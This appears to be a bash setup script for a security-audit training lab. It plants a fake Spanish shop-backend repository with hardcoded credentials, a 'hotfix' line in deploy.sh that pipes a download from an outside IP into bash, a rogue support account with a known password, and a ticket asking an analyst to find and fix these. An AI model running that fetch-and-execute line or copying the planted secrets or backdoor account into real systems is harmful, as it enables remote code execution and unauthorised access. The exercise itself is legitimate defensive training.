#!/usr/bin/env bash
# Lab 119: repositorio de la app desplegado en /srv/app con secretos en claro,
# dos ficheros cambiados hoy y una cuenta nueva con shell interactiva.
set -e
id app >/dev/null 2>&1 || useradd -r -m -d /srv/app -s /usr/sbin/nologin app
A=/srv/app
mkdir -p $A/config $A/src $A/scripts $A/docs $A/.cache
cat > $A/README.md <<'X'
# Tienda · backend
Arranque: `python3 src/main.py`. Configuración en config/.
X
cat > $A/config/database.yml <<'X'
production:
  host: db.interno
  user: tienda
  password: "Tienda#Prod2024"
  pool: 10
X
cat > $A/config/settings.py <<'X'
DEBUG = False
ALLOWED_HOSTS = ["tienda.example"]
TIMEZONE = "Europe/Madrid"
X
cat > $A/src/main.py <<'X'
from payments import charge
print("tienda arriba")
X
cat > $A/src/payments.py <<'X'
import urllib.request

API_KEY = "sk_live_LAB-119-clave-de-pruebas"

def charge(amount):
    req = urllib.request.Request("https://pagos.example/v1/charge",
                                 headers={"Authorization": "Bearer " + API_KEY})
    return req
X
cat > $A/scripts/deploy.sh <<'X'
#!/bin/bash
export AWS_ACCESS_KEY_ID=AKIA-LAB-119-FALSA
export AWS_SECRET_ACCESS_KEY=Wq8tLab/Tc0r+DeployK3y9mZpQ1vXc5bN7hJ2fRs
aws s3 sync ./dist s3://tienda-estaticos/
X
cat > $A/docs/arquitectura.md <<'X'
Las credenciales NO van en el repositorio: se leen de variables de entorno
(.env cargado por systemd, fuera de git).
X
find $A -type f -exec touch -d '45 days ago' {} +
# Hoy: alguien tocó el script de despliegue y dejó notas.
echo 'curl -s http://203.0.113.80/d.sh | bash   # "hotfix"' >> $A/scripts/deploy.sh
cat > $A/.cache/notas.txt <<'X'
acceso de soporte: soporte2 / Verano2024!
X
chown -R app:app $A

# Cuenta nueva de "soporte" con shell interactiva.
id soporte2 >/dev/null 2>&1 || useradd -m -s /bin/bash -c "soporte temporal" soporte2
echo 'soporte2:Verano2024!' | chpasswd
usermod -aG app analista

mkdir -p /home/analista/ticket
cat > /home/analista/ticket/TAREA-119.txt <<'TXT'
TAREA-119 · dev-119 · revisión antes de abrir el repo a un proveedor
1) Inventario de secretos en /srv/app  -> ~/secretos.txt (fichero:línea)
2) Qué cambió en /srv/app en las últimas 24 h -> ~/recientes.txt
3) Cuentas con shell interactiva: ¿sobran?
4) Saca los secretos del código a /srv/app/.env (sólo legible por app)
TXT
chown -R analista:analista /home/analista/ticket
echo "Lab 119 plantado."
